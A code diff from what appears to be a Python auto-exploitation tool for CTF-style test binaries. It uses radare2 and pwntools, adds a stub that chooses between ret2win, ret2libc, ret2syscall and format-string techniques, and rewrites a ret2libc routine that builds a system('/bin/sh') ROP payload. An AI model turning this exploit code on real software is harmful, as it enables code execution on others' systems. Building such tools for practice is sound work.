@@ -44,10 +44,26 @@ class App:
         self.pipe.cmd("aaa")
         self.elf = self.pipe.cmd("aflj")
         
-        #one = self.find_one_gadget(binary)
         self.ret2execve(binary)
         #self.generate_rop_chain({"rax": 0x3b, "rdi": 0xcafebabe, "rsi": 0, "rdx": 0})
 
+
+    # ============= EXPLOITS SECTION ===============
+
+    # this is the function that will detect what exploit to use and call it 
+    def handle_exploits(self, binary):
+        # check for "win" in pwnelf.sym -- ret2win/rop params
+        # check for "system" in pwnelf.plt -- ret2system 
+        # check for "execve" in pwnelf.plt -- ret2execve
+
+        # printf vulns -- read/write/got overwrite
+
+        # array abuse
+
+        # libc leak -- ret2one
+        # syscall gadget -- ret2syscall
+        # write gadget -- write gadgets
+        pass
 
     def ret2syscall(self, binary, excempt=0):
         io = process(binary)
@@ -130,7 +146,7 @@ class App:
 
     # in my test bins, one_gadget does not want to work
     # ret2libc works though
-    def ret2one(self, binary, one, add_ret=True):
+    def ret2one(self, binary, add_ret=True):
         io = process(binary) 
 
         vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
@@ -159,23 +175,14 @@ class App:
 
         payload = self.find_overflow(binary)
 
-        if pop_rdi:
-            print("[*] Attempting ret2libc")
-            payload += p64(pop_rdi)
-            payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
+        print("[*] Attempting ret2libc")
+        payload += p64(pop_rdi)
+        payload += p64(next(self.pwnlibc.search("/bin/sh")) + libcoff)
 
-            if add_ret:
-                payload += p64(ret)
+        if add_ret:
+            payload += p64(ret)
 
-            payload += p64(self.pwnlibc.sym["system"] + libcoff)
-
-        else: 
-            print("[*] Attempting one_gadget")
-
-            if add_ret:
-                payload += p64(ret)
-
-            payload += p64(one[3] + libcoff)
+        payload += p64(self.pwnlibc.sym["system"] + libcoff)
 
         io.sendlineafter(b">>>", payload)
 
